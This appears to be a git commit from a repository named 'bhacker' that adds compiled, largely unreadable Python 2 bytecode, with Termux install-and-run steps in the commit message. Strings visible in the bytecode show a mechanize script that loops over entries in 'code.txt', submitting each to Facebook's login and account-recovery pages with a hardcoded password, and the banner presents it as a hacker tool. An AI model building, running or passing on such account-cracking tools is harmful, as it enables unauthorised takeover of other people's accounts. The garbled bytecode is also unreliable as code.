e7b6c3ea6f55a79f3dfde8abcde0679a1a9f793a
Riyadvau00 <88074123+Riyadvau00@users.noreply.github.com>
2021-07-29 10:45:42 +0600

    Create Riyad00.py
    pkg update 
    pkg upgrade 
    pkg install python 
    pkg install python2 
    pkg install git 
    pip2 install requests 
    pip2 install mechanize 
    git clone https://github.com/Riyadvau00/bhacker.git
    ls
    cd bhacker 
    ls 
    python2 Riyad00.py

---
+++ Riyad00.py
@@ -0,0 +1,35 @@
+ó
+ó7Ô\c@síddlmZddlmZddlZddlZddlZddlZddlZeƒZej	ƒZ
+ejeƒej
+eƒejeƒejeƒeje
+ƒejejjƒddƒdgZZejdƒd	GHejd
+ƒdGHedƒZed
+ƒZdZeedƒZejddƒeejd<dejd<ej ƒx†ej!ƒD]xZ"e"j#dƒZ"ejdƒejeƒejddƒe"ejd<ej ƒejdƒej$ƒZ%de"GHqmWdS(iÿÿÿÿ(tBrowser(t
+BeautifulSoupNtmax_timeisDMozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0sdMozilla/5.0 (X11; U;Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1s"https://www.facebook.com/login.phps[93ms(figlet ......             Black ....... s9[92m   
+          ################################               
+          ##[91m  By:-Riyad Ahmed   [92m     ##
+          ##[91m  By:- lovebd  [92m        ##
+          ##[91m  By:- bangladeshi hacker[92m        ##
+          ##                            ##
+          ################################
+
+s![91m ![92m Entar ID ===>>[93m s#[91m ![92m Entar link ===>>[93m scode.txttrtnritemailtBlack2002Hackertpasss
+s=https://www.facebook.com/recover/initiate/?ars=facebook_logintnssleep 5s&[92m [[91m X[92m ] =========>[93m (sDMozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0sdMozilla/5.0 (X11; U;Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(&t	mechanizeRtbs4Rt	cookielibtrandomtostsystbrtLWPCookieJartcjtset_handle_robotstFalsetset_handle_equivtTruetset_handle_referertset_handle_redirectt
+set_cookiejartset_handle_refresht_httptHTTPRefreshProcessortheaderst
+useragentstopentsystemt	raw_inputtidtlinktwrtwtselect_formtformtsubmitt	readlinestitrstriptgeturlttrys(((s//data/data/com.termux/files/home/black/black.pyt<module>sH	
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
